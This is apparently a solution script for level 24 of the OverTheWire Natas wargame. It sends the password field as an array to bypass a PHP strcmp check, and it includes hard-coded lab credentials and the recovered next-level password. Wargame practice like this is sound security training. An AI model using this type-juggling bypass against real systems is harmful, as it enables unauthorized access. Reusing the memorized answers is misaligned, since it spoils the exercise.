import requests
import re

username = "natas24"
password = "0xzF30T9Av8lgXhW7slhFCIsVKAPyl2r"

url = "http://natas24.natas.labs.overthewire.org/"

session = requests.Session()
response = session.post(url,auth=(username,password),data={"passwd[]":"morla"})
content = response.text
print(content)

"password 25 : O9QD9DZBDq1YpswiTM5oqMDaOtuZtAcx"